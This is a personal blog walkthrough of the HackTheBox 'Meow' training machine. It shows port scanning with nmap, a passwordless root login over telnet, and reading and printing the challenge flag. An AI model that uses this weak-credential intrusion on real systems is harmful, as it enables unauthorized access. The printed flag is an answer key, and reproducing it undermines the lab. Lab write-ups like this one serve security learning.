---
title: "HackTheBox Starting Point: Meow Walkthrough"
date: 2025-01-07
description: 'This is my personal notes for HTB Meow Machine. Since this is just a starting point, I will provide a quick and short walkthrough for my notes.'
image: '/public/static/htb-cover.jpg'
tags: ["Weak Credentials", "Misconfiguration"]
authors: ['chjwoo']
---

Since this is just a starting point, I will provide a quick and short walkthrough for my notes.


In this case, my machine's IP address is `10.129.95.135`.  
We can check the connection using `ping` to verify whether the machine is reachable.
![](<Pasted image 20250107203655.png>)

## Reconnaissance
First things first, we need to enumerate the target's open ports to determine the services running on the machine. To do this, we use `nmap` with the following command:

```sh
sudo nmap -sV 10.129.95.135
```

![](<Pasted image 20250107211925.png>)

As you can see, port `23/tcp` is open for the Telnet service. We can attempt to establish a connection using this command:
```sh
telnet 10.129.95.135
```

![](<Pasted image 20250107212252.png>)
## Foothold
We can try enumerating common accounts, such as `admin`, `administrator`, or `root`. For the password, leave it blank as there might be a misconfiguration in the credentials.
```sh
┌──(w1thre㉿hackbox)-[~/cybersec/hackthebox/starting_point/meow]
└─$ telnet 10.129.95.135
Trying 10.129.95.135...
Connected to 10.129.95.135.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 07 Jan 2025 02:26:55 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.95.135
  IPv6 address for eth0: dead:beef::250:56ff:fe94:2889


75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 

```
After successfully logging in with the `root` account, we can proceed to identify the flag. Flags are often stored as text files in accessible directories, particularly in CTF-style challenges like this one. To locate the flag, follow these steps:
```sh
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 

```
Use the `ls` command to display the contents of the current directory. This will help you identify any files or folders available. In this case, the directory contains a file named `flag.txt` and a folder named `snap`.

Use the `cat` command to display the contents of the `flag.txt` file. This file typically contains the challenge flag, which is a unique string you need to capture and submit.
## Flags
The flag for this challenge is:
```
b40abdfe23665f766f9c61ecba8a4c19
```
This string represents your success in accessing the system and completing this step of the challenge.

:::note
This is my first attempt at writing a blog for HTB, and I want to use it as a stepping stone to deepen my skills in technical writing, especially in cybersecurity. Additionally, this blog serves as a personal note for future reference, helping me document what I’ve learned while also sharing knowledge with others starting in this field. 😂
:::